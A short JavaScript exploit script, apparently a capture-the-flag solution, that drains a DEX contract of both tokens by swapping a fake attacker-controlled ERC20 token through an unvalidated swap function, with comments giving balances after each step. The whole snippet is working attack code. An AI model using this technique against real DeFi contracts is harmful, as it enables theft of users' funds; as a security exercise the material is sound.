/**
 * Attacking by price manipulation with attack token(ERC20)
 */

//STEP 1
await contract.swap(process.env.FAKE_TOKEN_ADDRESS, await contract.token1(), 1)
/**
 * PLAYER STATE 
 *    token 1: 110
 *    token 2: 10
 * CONTRACT STATE
 *    token 1: 0
 *    token 2: 100
 */

//STEP 2
await contract.swap(process.env.FAKE_TOKEN_ADDRESS, await contract.token2(), 2)
/**
 * PLAYER STATE 
 *    token 1: 110
 *    token 2: 110
 * CONTRACT STATE
 *    token 1: 0
 *    token 2: 0
 */